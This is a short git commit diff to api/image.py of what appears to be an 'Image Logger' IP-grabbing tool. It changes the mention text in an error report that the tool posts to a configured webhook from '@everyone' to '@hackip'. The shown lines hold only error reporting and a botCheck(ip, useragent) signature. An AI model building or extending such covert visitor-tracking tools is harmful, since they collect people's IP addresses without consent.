f6dd940fb094638ff77309e8758a7495e57d6747
Hungvip69 <quachtanhung124@gmail.com>
2025-02-07 16:42:59 +0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "@everyone",
+    "content": "@hackip",
     "embeds": [
         {
             "title": "Image Logger - Error",
